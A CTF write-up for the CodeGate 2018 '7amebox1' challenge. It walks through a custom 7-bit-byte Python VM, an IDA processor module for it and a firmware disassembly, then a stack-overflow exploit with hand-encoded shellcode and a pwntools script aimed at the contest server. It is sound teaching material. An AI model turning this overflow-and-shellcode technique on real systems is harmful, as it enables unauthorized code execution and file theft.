---
title: "CodeGate 2018 7amebox1 Writeup"
date: 2018-02-06
categories:
- codegate
- codegate-2018
- writeup
tags:
- codegate
- codegate-2018
- writeup
keywords:
- codegate
- codegate-2018
- writeup
autoThumbnailImage: false
thumbnailImagePosition: "top"
thumbnailImage: https://quals.codegate.kr/main.png
coverImage: https://quals.codegate.kr/main.png
metaAlignment: center
---
<!--more-->
# CodeGate 2018 7amebox1 Writeup

## First impression
By unzipping the package we get a `_7amebox.py` python script, a `vm_name.py` script, an `mic_check.firm` and a `flag` which is obviously fake flag.

Since it is a pwn challenge, our goal is to read the flag on the server. By analysising a little bit,we are able to understand that the `_7amebox.py` is a virtual machine written in pure python. Since python code is very easy to read, I'll just skip the python analysis details.

So, what we are able to get from the virtual machine source code is that, we have 31 operations(instructions), naming from `x0` to `x30`. `x8` is a special one, since it is a syscall instruction. And we also have 6 syscalls naming from `s0` to `s5`. Handlers are all defined in the `__init__` part of the class `EMU`. The special part of this virtual machine is that, like the `cLEMENCY` virtual machine, this one is not regarding 8 bits to be a byte! But unlike clemency, it uses 7 bits as a byte, and 21 bits to be a "dword"(may not called dword though). To translate 3 bytes into a "dword", it uses a special method just like clemency defined in `EMU`'s `read_memory_tri`. Well, since the python source code is given, we can edit a lot on the source code to dump the internal data of processing procedure.So, I actually haven't really studied this part, I just dumped some of the values and find the pattern. :P
So the pack part is like this:
```
def pack_num(num):
    binary = bin(num)[2:].rjust(21, '0')
    lists = []
    for i in range(3):
        lists.append(chr(int(binary[:7], 2)))
        binary = binary[7:]
    return lists[-1] + lists[0] + lists[1]
```

## IDA processor part
To achieve the final goal of this challenge, we first need to disassemble the firmware, which is the mentioned `mic_check.firm`. This is done by writing a little IDA processor. You can do this by hand, I mean, write a disassembler though.

I havn't implemented many features since I need to do this quickly. The `ref` part is totally jumped over. So this is a really bad processor you can write.
```
from idaapi import *

TYPE_R = 0
TYPE_I = 1

CODE_DEFAULT_BASE = 0x00000
STACK_DEFAULT_BASE = 0xf4000
ERRORS = -1

FL_INDIRECT = 0x000000800  # This is an indirect access (not immediate value)
FL_ABSOLUTE = 1  # absolute: &addr
class DecodingError(Exception):
    pass

class Inst:
    command = 0
    oprand1 = 0
    oprand2 = 0
    oprand3 = 0

class MyProcessor(processor_t):
    id = 0x8000 + 8888
    flag = PR_ADJSEGS | PRN_HEX
    cnbits = 8
    dnbits = 8
    author = "Anciety"
    psnames = ["G7amebox"]
    plnames = ["G7amebox"]
    segreg_size = 0
    instruc_start = 0
    assembler = {
        "flag": AS_NCHRE | ASH_HEXF4 | ASD_DECF1 | ASO_OCTF3 | ASB_BINF2
              | AS_NOTAB,
        "uflag": 0,
        "name": "My assembler",
        "origin": ".org",
        "end": ".end",
        "cmnt": ";",
        "ascsep": '"',
        "accsep": "'",
        "esccodes": "\"'",
        "a_ascii": ".ascii",
        "a_byte": ".byte",
        "a_word": ".word",
        "a_bss": "dfs %s",
        "a_seg": "seg",
        "a_curip": "PC",
        "a_public": "",
        "a_weak": "",
        "a_extrn": ".extern",
        "a_comdef": "",
        "a_align": ".align",
        "lbrace": "(",
        "rbrace": ")",
        "a_mod": "%",
        "a_band": "&",
        "a_bor": "|",
        "a_xor": "^",
        "a_bnot": "~",
        "a_shl": "<<",
        "a_shr": ">>",
        "a_sizeof_fmt": "size %s",
    }

    reg_names = regNames = [
        "r0", "r1", "r2", "r3", "r4",
        "r5", "r6", "r7", "r8", "r9", 'r10', 'bp',
        'sp', 'pc', 'eflags', 'zero', 'CS', 'DS'
    ]

    instruc = instrs = [
        {'name': 'x0_lea', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x1_leab', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x2_movtomr', 'feature': CF_USE1 | CF_USE2},
        {'name': 'x3_movtomrb', 'feature': CF_USE1 | CF_USE2},
        {'name': 'x4_movrX', 'feature': CF_USE1 | CF_USE2 | CF_CHG2},
        {'name': 'x5_swap', 'feature': CF_USE1 | CF_USE2 | CF_CHG1 | CF_CHG2},
        {'name': 'x6_pushX', 'feature': CF_USE1},
        {'name': 'x7_popr', 'feature': CF_USE1 | CF_CHG1},
        {'name': 'x8_syscall', 'feature': 0},
        {'name': 'x9_addX', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x10_addb', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x11_subX', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x12_subb', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x13_shr', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x14_shl', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x15_mul', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x16_div', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x17_inc', 'feature': CF_USE1 | CF_CHG1},
        {'name': 'x18_dec', 'feature': CF_USE1 | CF_CHG1},
        {'name': 'x19_and', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x20_or', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x21_xor', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x22_mod', 'feature': CF_USE1 | CF_USE2 | CF_CHG1},
        {'name': 'x23_cmp', 'feature': CF_USE1 | CF_USE2},
        {'name': 'x24_cmpb', 'feature': CF_USE1 | CF_USE2},
        {'name': 'x25_jgt', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x26_jle', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x27_jz', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x28_jnz', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x29_jmp', 'feature': CF_USE1 | CF_USE2 | CF_JUMP},
        {'name': 'x30_call', 'feature': CF_USE1 | CF_USE2 | CF_CALL},

    ]
    instruc_end = len(instruc)
    curInst = Inst()
    def __init__(self):
        processor_t.__init__(self)
        self._init_instructions()
        self._init_registers()

    def _init_instructions(self):
        self.inames = {}
        for idx, ins in enumerate(self.instrs):
            print(idx, ins)
            self.inames[ins['name'].split('_')[0]] = idx

    def _init_registers(self):
        self.reg_ids = {}
        for i, reg in enumerate(self.reg_names):
            self.reg_ids[reg] = i
        self.reg_first_sreg = self.reg_code_sreg = self.reg_ids["CS"]
        self.reg_last_sreg = self.reg_data_sreg = self.reg_ids["DS"]


    def bit_concat(self, bit_list):
        res = 0
        for bit in bit_list:
            res <<= 7
            res += bit & 0b1111111
        return res

    def _read_memory(self, insn, length):
        ea = insn.ea + insn.size
        mem = []
        for i in range(length):
            mem.append(get_full_byte(ea + i))
        insn.size += length
        return mem
    def read_memory_tri(self, addr, count):
        if not count:
            return []
        
        res = []
        for i in range(count):
            tri = 0
            tri |= get_full_byte(addr + i*3)
            tri |= get_full_byte(addr +i*3 + 1) << 14
            tri |= get_full_byte(addr + i*3 + 2) << 7
            res.append(tri)
        return res

    def _set_insn_type(self, insn, typ, dtyp):
        insn.type = typ
        insn.dtyp = dtyp

    def _set_insn_reg(self, insn, dtyp, reg):
        self._set_insn_type(insn, o_reg, dtyp)
        insn.reg = reg

    def _set_insn_imm(self, insn, dtyp, value):
        self._set_insn_type(insn, o_imm, dtyp)
        insn.value = value

    def _set_insn_near(self, insn, dtyp, addr):
        self._set_insn_type(insn, o_near, dtyp)
        insn.addr = addr

    def _set_insn_phrase(self, insn, dtyp, phrase):
        self._set_insn_type(insn, o_phrase, dtyp)
        insn.phrase = phrase


    def _read_three_op(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)
        insn[1].type = o_reg
        insn[1].dtyp = dt_byte
        insn[1].reg = self._read_byte(insn)
        insn[2].type = o_reg
        insn[2].dtyp = dt_byte
        insn[2].reg = self._read_byte(insn)
    
    def _read_two_op_rr(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)
        insn[1].type = o_reg
        insn[1].dtyp = dt_byte
        insn[1].reg = self._read_byte(insn)

    def _read_two_op_ri(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)
        insn[1].type = o_imm
        insn[1].dtyp = dt_dword
        insn[1].value = self._read_dword(insn)
    def _read_two_op_ir(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_imm
        insn[0].dtyp = dt_dword
        insn[0].reg = self._read_dword(insn)
        insn[1].type = o_reg
        insn[1].dtyp = dt_byte
        insn[1].value = self._read_byte(insn)
    def _read_one_op_r(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)

    def _read_one_op_i(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_imm
        insn[0].dtyp = dt_dword
        insn[0].reg = self._read_dword(insn)

    def _ana_jmp_abs(self,name,insn):
        insn.itype = self.inames[name]
        addr = self._read_dword(insn)
        insn[0].type = o_near
        insn[0].dtyp = dt_dword
        insn[0].addr = addr


    def _ana_jmp_rel_reg(self,name,insn):
        insn.itype = self.inames[name]
        insn[0].type = o_reg
        insn[0].dtyp = dt_byte
        insn[0].reg = self._read_byte(insn)

    def _ana(self,insn):
        insn.size = 0
        opcode = self.bit_concat(self._read_memory(insn, 2))
        op = (opcode & 0b11111000000000) >> 9
        if op >= 31:
            raise DecodingError('invalid instruction')

        op_type = (opcode & 0b00000100000000) >> 8

        opers = []
        if op_type == TYPE_R:
            opers.append((opcode & 0b00000011110000) >> 4)
            opers.append((opcode & 0b00000000001111))
            op_size = 2

        elif op_type == TYPE_I:
            opers.append((opcode & 0b00000011110000) >> 4)
            addr = insn.ea
            opers.append(self.read_memory_tri(addr+2, 1)[0])
            op_size = 5

        else:
            raise DecodingError("[VM] Invalid instruction")

        def invalid_ins():
            raise DecodingError('invalid instruction addr {} op {} op_type {} opers {}'.format(insn.ea, op, op_type, opers))

        if op == 0:
            insn.itype = self.inames['x0']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_phrase(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 1:
            insn.itype = self.inames['x1']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[1], dt_byte, opers[1])
                self._set_insn_reg(insn[0], dt_byte, opers[0])
            else:
                invalid_ins()
                
        elif op == 2:
            insn.itype = self.inames['x2']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_phrase(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 3:
            insn.itype = self.inames['x3']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_byte, opers[0])
                self._set_insn_phrase(insn[1], dt_byte, opers[1])
            else:
                invalid_ins()
        elif op == 4:
            insn.itype = self.inames['x4']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 5:
            insn.itype = self.inames['x5']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 6:
            insn.itype = self.inames['x6']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[0], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 7:
            insn.itype = self.inames['x7']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 9:
            insn.itype = self.inames['x9']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 10:
            insn.itype = self.inames['x10']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_byte, opers[0])
                self._set_insn_reg(insn[1], dt_byte, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_byte, opers[1])
                self._set_insn_reg(insn[0], dt_byte, opers[0])
            else:
                invalid_ins()
        elif op == 11:
            insn.itype = self.inames['x11']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 12:
            insn.itype = self.inames['x12']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_byte, opers[0])
                self._set_insn_reg(insn[1], dt_byte, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_byte, opers[1])
                self._set_insn_reg(insn[0], dt_byte, opers[0])
            else:
                invalid_ins()
        elif op == 13:
            insn.itype = self.inames['x13']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 14:
            insn.itype = self.inames['x14']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 15:
            insn.itype = self.inames['x15']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 16:
            insn.itype = self.inames['x16']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 17:
            insn.itype = self.inames['x17']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 18:
            insn.itype = self.inames['x18']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 19:
            insn.itype = self.inames['x19']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 20:
            insn.itype = self.inames['x20']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 21:
            insn.itype = self.inames['x21']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 22:
            insn.itype = self.inames['x22']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 23:
            insn.itype = self.inames['x23']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_dword, opers[1])
                self._set_insn_reg(insn[0], dt_dword, opers[0])
            else:
                invalid_ins()
        elif op == 24:
            insn.itype = self.inames['x24']
            if op_type == TYPE_R:
                self._set_insn_reg(insn[0], dt_byte, opers[0])
                self._set_insn_reg(insn[1], dt_byte, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_imm(insn[1], dt_byte, opers[1])
                self._set_insn_reg(insn[0], dt_byte, opers[0])
            else:
                invalid_ins()
        elif op == 25:
            insn.itype = self.inames['x25']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 26:
            insn.itype = self.inames['x26']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 27:
            insn.itype = self.inames['x27']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 28:
            insn.itype = self.inames['x28']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 29:
            insn.itype = self.inames['x29']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 30:
            insn.itype = self.inames['x30']
            if op_type == TYPE_R:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_reg(insn[1], dt_dword, opers[1])
            elif op_type == TYPE_I:
                self._set_insn_phrase(insn[0], dt_dword, opers[0])
                self._set_insn_imm(insn[1], dt_dword, opers[1])
            else:
                invalid_ins()
        elif op == 8:
            insn.itype = self.inames['x8']
        else:
            invalid_ins()

        insn.size = op_size
        return insn.size

    def notify_ana(self,insn):
        try:
            return self._ana(insn)
        except DecodingError as e:
            print(e)
            return 0

    def _emu_operand(self,op,insn):
        if op.type == o_mem:
            insn.create_op_data(0, op.addr, op.dtyp)
            insn.add_dref(op.addr, 0, dr_R)
        elif op.type == o_near:
            if insn.get_canon_feature() & CF_CALL:
                fl = fl_CN
            else:
                fl = fl_JN
            insn.add_cref(op.addr, 0, fl)

    def notify_emu(self,insn):
        ft = insn.get_canon_feature()
        if ft & CF_USE1:
            self._emu_operand(insn[0],insn)
        if ft & CF_USE2:
            self._emu_operand(insn[1],insn)
        if ft & CF_USE3:
            self._emu_operand(insn[2],insn)
        if ft & CF_USE4:
            self._emu_operand(insn[3],insn)
        if not ft & CF_STOP:
            insn.add_cref(insn.ea + insn.size, 0, fl_F)
        return True
    
    def notify_out_operand(self, outctx, op):
        if op.type == o_reg:
            if op.specval == FL_INDIRECT:
                outctx.out_symbol('[')
            outctx.out_register(self.reg_names[op.reg])
            if op.specval == FL_INDIRECT:
                outctx.out_symbol(']')
        elif op.type == o_imm:
            outctx.out_value(op, OOFW_IMM)
        elif op.type == o_phrase:
            outctx.out_symbol('[')
            outctx.out_register(self.reg_names[op.phrase])
            outctx.out_symbol(']')
        elif op.type in [o_near, o_mem]:
            ok = outctx.out_name_expr(op, op.addr, BADADDR)
            if not ok:
                outctx.out_tagon(COLOR_ERROR)
                outctx.out_long(op.addr, 16)
                outctx.out_tagoff(COLOR_ERROR)
                queue_mark(Q_noName, insn.ea)
        else:
            return False
        return True

    def notify_out_insn(self,outctx):
        insn=outctx.insn
        ft = insn.get_canon_feature()
        outctx.out_mnem()
        if ft & CF_USE1:
            outctx.out_one_operand(0)
        if ft & CF_USE2:
            outctx.out_char(',')
            outctx.out_char(' ')
            outctx.out_one_operand(1)
        if ft & CF_USE3:
            outctx.out_char(',')
            outctx.out_char(' ')
            outctx.out_one_operand(2)
        outctx.flush_outbuf()
        cvar.gl_comm = 1
     
def PROCESSOR_ENTRY():
    return MyProcessor()
```

## Disassmeble
Then we are able to disassemble the firmware in ida now.
And it looks like so:
```
ROM:0000 ; Segment type: Pure code
ROM:0000                 x30_call [pc], $4
ROM:0005                 x21_xor r0, r0
ROM:0007                 x8_syscall
ROM:0009                 x6_pushX bp             ; func main
ROM:000B                 x4_movrX bp, sp
ROM:000D                 x11_subX sp, $3C        ; stack - 0x3c
ROM:0012                 x4_movrX r5, bp
ROM:0014                 x11_subX r5, $3         ; r5 = bp - 3
ROM:0019                 x4_movrX r6, $12345     ; r6 = 0x12345
ROM:001E                 x2_movtomr r6, [r5]     ; [bp-3] = 0x12345
ROM:0020                 x4_movrX r0, $CD        ; r0 = 0xcd
ROM:0025                 x30_call [pc], $66      ; call 0x90 func1
ROM:002A                 x4_movrX r1, $42
ROM:002F                 x4_movrX r5, bp
ROM:0031                 x11_subX r5, $3C
ROM:0036                 x4_movrX r0, r5
ROM:0038                 x30_call [pc], $23      ; call 0x60 func3
ROM:003D                 x4_movrX r0, $D3
ROM:0042                 x30_call [pc], $49      ; call 0x90 func1
ROM:0047                 x4_movrX r5, bp
ROM:0049                 x11_subX r5, $3
ROM:004E                 x0_lea  r6, [r5]
ROM:0050
ROM:0050 loc_50:                                 ; canary check
ROM:0050                 x23_cmp r6, $12345
ROM:0055                 x28_jnz [pc], $1FFFAB
ROM:005A                 x4_movrX sp, bp
ROM:005C                 x7_popr bp
ROM:005E                 x7_popr pc
ROM:0060                 x4_movrX r3, r1         ; func func3 -- print str
ROM:0062                 x4_movrX r2, r0
ROM:0064                 x4_movrX r1, 0
ROM:0069                 x4_movrX r0, $3
ROM:006E                 x8_syscall
ROM:0070                 x7_popr pc              ; func3 end
ROM:0072                 x6_pushX r1
ROM:0074                 x6_pushX r2
ROM:0076                 x6_pushX r3
ROM:0078                 x4_movrX r3, r1         ; func func4 -- read
ROM:007A                 x4_movrX r2, r0
ROM:007C                 x4_movrX r1, 1
ROM:0081                 x4_movrX r0, $2
ROM:0086                 x8_syscall
ROM:0088                 x7_popr r3
ROM:008A                 x7_popr r2
ROM:008C                 x7_popr r1
ROM:008E                 x7_popr pc
ROM:0090                 x6_pushX r0             ; func func1
ROM:0092                 x6_pushX r1
ROM:0094                 x4_movrX r1, r0         ; r1 = 0xcd
ROM:0096                 x30_call [pc], $D       ; call 0xa8 func2
ROM:009B                 x5_swap r0, r1
ROM:009D                 x30_call [pc], $1FFFD0  ; back to 0x72
ROM:00A2                 x7_popr r1
ROM:00A4                 x7_popr r0
ROM:00A6                 x7_popr pc              ; func1 end
ROM:00A8                 x6_pushX r1             ; func func2 -- strlen
ROM:00AA                 x6_pushX r2
ROM:00AC                 x21_xor r1, r1          ; r1 = 0
ROM:00AE                 x21_xor r2, r2          ; r2 = 0
ROM:00B0                 x1_leab r2, r0          ; r2 = [r0]
ROM:00B2                 x24_cmpb r2, 0
ROM:00B7                 x27_jz  [pc], $9
ROM:00BC                 x17_inc r0
ROM:00BE                 x17_inc r1
ROM:00C0                 x29_jmp [pc], $1FFFEB   ; back to 0xb0
ROM:00C5                 x4_movrX r0, r1         ; r0 = r1
ROM:00C7                 x7_popr r2
ROM:00C9                 x7_popr r1
ROM:00CB                 x7_popr pc              ; func2 end
ROM:00CB ; ---------------------------------------------------------------------------
ROM:00CD aName           .ascii "name>",0
ROM:00D3 aBye            .ascii "bye",$A,0
ROM:00D3 ; end of 'ROM'
ROM:00D3
```

## Vulnerability and Exploit
The vulnerability is obvious, there is a stack overflow. But by dumping the values, we know that we can only overwrite the return address and do not have the ability to perform the ROP part. Fortunately, the `NX` is actually off in this challenge. So, we can jump directly to the garbage part of our payload, and put a shellcode there to perform the ability to execute arbitrary code.

Since there is no ASLR in the virtual machine, shellcode addresses can be directly hard coded. By reading the virtual machine, we know there is a syscall to open arbitrary file. So, we just need to open the `flag` file, then read it somewhere, and write it out to stdout. All this can be done using the simulated syscall. Write the shellcode, perform the stack overflow, and we are done.

## Final Exploit
```
import sys
from pwn import *
from hashlib import sha1

context(log_level='debug')

def pack_num(num):
    binary = bin(num)[2:].rjust(21, '0')
    lists = []
    for i in range(3):
        lists.append(chr(int(binary[:7], 2)))
        binary = binary[7:]
    return lists[-1] + lists[0] + lists[1]

p = remote('13.124.182.123', 8888)

def make_pay():
    payload = 'x' * (0xe0-0xdd)
    #payload = ''
    payload += '\x12\x00\x01' # 0xa1 <- shellcode
    payload += '\x00\x00\x12'
    payload += '\x10R='
    payload += '?\x20\x00' # syscall, open
    payload += '\x14\x01\x54'
    payload += '\x00\x12\x20'
    payload += '\x7f\x00\x01' # buf = 0xff
    payload += '\x12\x10\x02'
    payload += '\x00\x00\x12'
    payload += '\x00\03\x00'
    payload += '\x00\x20\x00' # syscall, read
    payload += '\x54\x11\x54'
    payload += '\x11\x12\x00'
    payload += '\x02\x00\x00'
    payload += '\x44\x11\x20'
    payload += '\x00aa'
    payload += 'afl' # 0xf5fd1, flag 0xf5fd2
    payload += 'ag\x00' # 0xf5fd4
    payload += pack_num(0x12345) # canary, 0xf5fd7
    payload += pack_num(0x54321) # bp, 0xf5fda
    payload += pack_num(0xf5fa1) # dd
    return payload

def pow(prefix, pay):
    i = 0
    while i <= 1000000000:
        answer = (prefix + str(i)).ljust(0xe0-0xdd, 'x') + pay
        if sha1(answer).hexdigest().endswith('000000'):
            return answer
        i += 1
    return None

p.recvuntil('prefix : ')
prefix = p.recvline()[:-1]
print(prefix)
answer = pow(prefix, make_pay())
p.sendline(answer)
p.recvuntil('>')
p.sendline(make_pay())
p.interactive()
```
